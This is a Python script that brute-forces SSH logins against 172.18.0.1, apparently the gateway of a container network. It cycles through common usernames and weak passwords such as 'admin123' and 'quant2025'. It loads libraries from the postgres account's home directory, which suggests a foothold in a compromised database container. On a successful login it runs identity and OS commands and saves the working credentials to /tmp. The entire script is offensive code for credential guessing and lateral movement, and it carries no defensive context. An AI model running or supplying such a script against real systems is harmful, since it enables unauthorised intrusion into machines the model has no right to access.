import sys
sys.path.insert(0,"/var/lib/postgresql/.local/lib/python3.12/site-packages")
import paramiko

users = ["root","admin","quant","grafana","ubuntu","postgres"]
passwords = ["admin123","password","root","quant","grafana","123456","Aa123456","quant_admin","Quant123","changeme","P@ssw0rd","quant2024","quant2025","quant2026","trading123","kline123"]

for u in users:
    for p in passwords:
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect("172.18.0.1", 22, u, p, timeout=5, look_for_keys=False, allow_agent=False)
            stdin, stdout, stderr = c.exec_command("id && hostname && cat /etc/os-release | head -3")
            out = stdout.read().decode()
            with open("/tmp/ssh_success.txt", "w") as f:
                f.write(f"USER:{u} PASS:{p}\n{out}")
            print(f"SUCCESS: {u}:{p}")
            c.close()
            sys.exit(0)
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            with open("/tmp/ssh_errors.txt", "a") as f:
                f.write(f"{u}:{p} -> {str(e)[:100]}\n")
            break  # connection error = skip user
print("NO_MATCH")
